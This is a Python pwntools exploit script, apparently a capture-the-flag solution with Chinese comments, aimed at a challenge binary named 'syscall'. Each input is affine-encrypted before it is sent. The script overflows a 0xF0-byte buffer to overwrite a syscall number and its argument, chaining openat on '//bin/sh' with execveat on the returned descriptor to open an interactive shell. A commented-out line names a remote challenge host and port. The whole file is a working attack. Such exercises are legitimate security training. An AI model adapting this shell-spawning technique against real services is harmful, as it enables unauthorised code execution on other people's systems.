#!/usr/bin/env python
# -*- coding: UTF-8 -*-
from pwn import *

# 显示详细的信息
context(log_level='debug')

# 本地测试
p = process("./syscall")
# p = remote("34.80.207.78", 10004)

def decrypt(data):
    p.sendlineafter(">", '1')
    # 仿射密码加密
    data_enc = ''
    for c in data:
        data_enc += chr((ord(c) * 0x17 + 0x23) % 0x100)
    p.sendlineafter("context:", data_enc)

SYS_openat    = 257
STUB_execveat = 322

# openat(NULL, "//bin/sh", 8) = 3;
payload  = "//bin/sh".ljust(0xF0, '\x00') # 缓冲区 s 的内容
payload += p64(SYS_openat)  # v4，系统调用号
payload += p64(0)           # v5，第一个参数
decrypt(payload)

fd = 3
# execveat(3, "", NULL, NULL, AT_EMPTY_PATH) -> Get shell （AT_EMPTY_PATH = 0x1000）
payload  = '\x00' * 0xF0 
payload += p64(STUB_execveat) 
payload += p64(fd)
decrypt(payload)

p.interactive()
